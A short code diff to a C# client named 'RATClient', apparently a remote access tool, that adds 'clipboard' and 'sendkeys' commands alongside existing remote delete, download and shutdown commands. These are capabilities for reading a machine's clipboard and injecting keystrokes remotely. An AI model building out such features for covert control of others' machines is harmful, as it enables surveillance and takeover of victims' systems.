@@ -42,6 +42,8 @@ namespace RATClient
                     case "delete":
                     case "download":
                     case "shutdown":
+                    case "clipboard":
+                    case "sendkeys":
                         if (!ConnectCheck()) break;
                         SendCommand(CMDS);
                         break;
